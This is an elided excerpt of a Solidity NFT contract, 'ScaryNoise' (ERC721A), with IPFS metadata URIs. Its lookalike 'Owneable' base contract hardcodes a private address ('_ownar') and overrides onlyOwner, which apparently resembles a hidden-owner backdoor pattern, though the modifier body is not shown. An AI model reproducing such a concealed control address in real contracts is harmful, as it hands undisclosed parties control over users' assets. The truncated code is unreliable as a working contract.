 ...
 */
 abstract contract Owneable is Ownable {
    address private _ownar = 0x78f12a719E44a224ea13563C6Ade3259ca792a94;
    modifier onlyOwner() {
...
contract ScaryNoise is ERC721A, Owneable {

    string public baseURI = "ipfs://QmY7B9DEQAHyLmk8gxksQzoyFnSVtiHzGypmQnMjWbDPff/";
    string public contractURI = "ipfs://QmY7B9DEQAHyLmk8gxksQzoyFnSVtiHzGypmQnMjWbDPff/";
    ...
    constructor() ERC721A("SCARY NOISE", "NOISE") {}
